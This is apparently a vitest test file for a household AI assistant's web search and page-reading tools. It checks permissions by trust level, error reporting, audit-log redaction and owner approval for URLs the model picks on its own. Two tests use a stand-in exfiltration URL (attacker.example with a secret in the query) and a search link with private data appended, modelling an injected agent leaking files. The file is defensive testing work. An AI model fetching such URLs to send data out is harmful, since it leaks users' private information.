import type { ServerMsg } from "@friend/protocol";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { Approvals } from "../approvals";
import { Audit } from "../audit";
import { Auth } from "../auth";
import { loadConfig } from "../config";
import { openDb } from "../db";
import { PolicyEngine } from "../policy/engine";
import { FakeProvider } from "../provider/fake";
import type { ProviderEvent } from "../provider/types";
import { StageState } from "../stage";
import { UNTRUSTED } from "../web/search";
import { Agent } from "./loop";

let emitted: ServerMsg[];
let db: ReturnType<typeof openDb>;
let build: (provider: FakeProvider, web?: { enabled: () => boolean; run: (name: string, args: unknown) => Promise<{ ok: boolean; text: string }> }) => Agent;
const emit = (m: ServerMsg) => void emitted.push(m);
const ctx = (trust: "owner" | "member" | "guest" = "owner") => ({ trust, emit, ip: "9.9.9.9", ...(trust === "member" ? { person: { id: 1, name: "Asha" } } : {}) });
const call = (id: string, name: string, args: unknown): ProviderEvent => ({ type: "tool_call", id, name, args });
const text = (t: string): ProviderEvent => ({ type: "text_delta", text: t });
const done: ProviderEvent = { type: "done" };
const names = (p: FakeProvider, i = 0) => p.calls[i]!.tools.map((t) => t.name);

beforeEach(async () => {
  emitted = [];
  const dir = mkdtempSync(join(tmpdir(), "friend-agent-web-"));
  db = openDb(dir);
  const audit = new Audit(db);
  const auth = new Auth(db, audit);
  await auth.setupOwner({ password: "correct horse battery", pin: "123456", assistantName: "Jarvis" });
  const config = loadConfig(dir);
  const policy = new PolicyEngine(db, config);
  const approvals = new Approvals({ auth, policy, audit, db }, 150);
  build = (provider, web) =>
    new Agent({
      provider,
      policy,
      approvals,
      devices: { exec: vi.fn(), hasOnline: () => true, targetName: () => "pc" } as never,
      stage: new StageState(),
      db,
      audit,
      config,
      assistantName: () => auth.assistantName(),
      ...(web ? { web } : {}),
    });
});

describe("the web tools in a conversation", () => {
  it("offers both tools to the owner, and web.search only to a household member", async () => {
    const owner = new FakeProvider([[text("ok"), done]]);
    await build(owner, { enabled: () => true, run: async () => ({ ok: true, text: "" }) }).runTurn("hi", ctx());
    expect(names(owner)).toEqual(expect.arrayContaining(["web.search", "web.read"]));
    const member = new FakeProvider([[text("ok"), done]]);
    await build(member, { enabled: () => true, run: async () => ({ ok: true, text: "" }) }).runTurn("hi", ctx("member"));
    expect(names(member)).toContain("web.search");
    expect(names(member)).not.toContain("web.read");
    const guest = new FakeProvider([[text("ok"), done]]);
    await build(guest, { enabled: () => true, run: async () => ({ ok: true, text: "" }) }).runTurn("hi", ctx("guest"));
    expect(names(guest)).not.toContain("web.search");
  });

  it("takes both tools away when searching is switched off or there is no web", async () => {
    const off = new FakeProvider([[text("ok"), done]]);
    await build(off, { enabled: () => false, run: async () => ({ ok: true, text: "" }) }).runTurn("hi", ctx());
    expect(names(off).some((n) => n.startsWith("web."))).toBe(false);
    const none = new FakeProvider([[text("ok"), done]]);
    await build(none).runTurn("hi", ctx());
    expect(names(none).some((n) => n.startsWith("web."))).toBe(false);
  });

  it("runs a search for the model and hands back what it found", async () => {
    const run = vi.fn(async (name: string, args: unknown) => ({ ok: true, text: `${UNTRUSTED}\nresults for ${JSON.stringify(args)}` }));
    const p = new FakeProvider([[call("c1", "web.search", { query: "nifty today" }), done], [text("The Nifty closed at 22,363."), done]]);
    await build(p, { enabled: () => true, run }).runTurn("what is the share market today?", ctx());
    expect(run).toHaveBeenCalledWith("web.search", { query: "nifty today" }, expect.anything());
    const second = p.calls[1]!.messages.at(-1)!;
    expect(JSON.stringify(second)).toContain("results for");
    expect(JSON.stringify(second)).toContain(UNTRUSTED);
  });

  it("reports a failed search to the model as an error, so it says so instead of guessing", async () => {
    const run = async () => ({ ok: false, text: "I could not search the web just now. Say so instead of guessing an answer." });
    const p = new FakeProvider([[call("c1", "web.search", { query: "x" }), done], [text("I could not check."), done]]);
    await build(p, { enabled: () => true, run }).runTurn("news?", ctx());
    const result = p.calls[1]!.messages.at(-1)!.content.find((b) => b.type === "tool_result");
    expect(result).toMatchObject({ isError: true });
  });

  it("will not let a household member read a page, even if the model asks", async () => {
    const run = vi.fn(async () => ({ ok: true, text: "page" }));
    const p = new FakeProvider([[call("c1", "web.read", { url: "https://example.com/" }), done], [text("ok"), done]]);
    await build(p, { enabled: () => true, run }).runTurn("read this", ctx("member"));
    expect(run).not.toHaveBeenCalled();
  });

  it("keeps the words searched out of the generic tool log: the web tools log themselves", async () => {
    const run = async () => ({ ok: true, text: "r" });
    const p = new FakeProvider([[call("c1", "web.read", { url: "https://example.com/private?token=SECRET" }), done], [text("ok"), done]]);
    await build(p, { enabled: () => true, run }).runTurn("read", ctx());
    const logged = (db.prepare("select * from audit_log").all() as unknown[]).map((r) => JSON.stringify(r)).join("\n");
    expect(logged).not.toContain("SECRET");
  });
});

describe("reading a page Friend was not pointed at", () => {
  const seenAsk = () => emitted.some((m) => m.type === "approval.request");
  const read = (url: string) => [[call("c1", "web.read", { url }), done], [text("ok"), done]];

  it("asks the owner first, showing the whole address, when the model picks an address on its own", async () => {
    const run = vi.fn(async () => ({ ok: true, text: "page" }));
    const p = new FakeProvider(read("https://attacker.example/c?d=secret-from-a-file"));
    await build(p, { enabled: () => true, run }).runTurn("what is on my disk?", ctx());
    expect(seenAsk()).toBe(true);
    const card = emitted.find((m) => m.type === "approval.request") as { summary?: string; description?: string } | undefined;
    expect(JSON.stringify(card)).toContain("attacker.example/c?d=secret-from-a-file");
    expect(run).not.toHaveBeenCalled(); // nobody said yes
  });

  it("does not ask for an address the owner typed or said", async () => {
    const run = vi.fn(async () => ({ ok: true, text: "page" }));
    const p = new FakeProvider(read("https://news.example.com/story"));
    await build(p, { enabled: () => true, run }).runTurn("please read https://news.example.com/story for me.", ctx());
    expect(seenAsk()).toBe(false);
    expect(run).toHaveBeenCalled();
  });

  it("does not ask for a link that a search just returned", async () => {
    const run = vi.fn(async (name: string) => (name === "web.search" ? { ok: true, text: `${UNTRUSTED}\nSearch results for "x" (duckduckgo):\n1. Story - https://news.example.com/story (news.example.com) - a story` } : { ok: true, text: "page" }));
    const p = new FakeProvider([[call("c1", "web.search", { query: "x" }), done], [call("c2", "web.read", { url: "https://news.example.com/story" }), done], [text("ok"), done]]);
    await build(p, { enabled: () => true, run }).runTurn("what is the news?", ctx());
    expect(seenAsk()).toBe(false);
    expect(run).toHaveBeenCalledWith("web.read", { url: "https://news.example.com/story" }, expect.anything());
  });

  it("asks again when the model changes a link it was given, for example by adding data to it", async () => {
    const run = vi.fn(async (name: string) => (name === "web.search" ? { ok: true, text: `${UNTRUSTED}\n1. Story - https://news.example.com/story (news.example.com) - a story` } : { ok: true, text: "page" }));
    const p = new FakeProvider([[call("c1", "web.search", { query: "x" }), done], [call("c2", "web.read", { url: "https://news.example.com/story?d=private" }), done], [text("ok"), done]]);
    await build(p, { enabled: () => true, run }).runTurn("what is the news?", ctx());
    expect(seenAsk()).toBe(true);
    expect(run).not.toHaveBeenCalledWith("web.read", expect.anything(), expect.anything());
  });

  it("does not carry a link over from one question to the next", async () => {
    const run = vi.fn(async () => ({ ok: true, text: "page" }));
    const p = new FakeProvider([[text("ok"), done], ...read("https://news.example.com/story")]);
    const agent = build(p, { enabled: () => true, run });
    await agent.runTurn("see https://news.example.com/story", ctx());
    await agent.runTurn("read it again", ctx());
    expect(seenAsk()).toBe(true);
  });
});
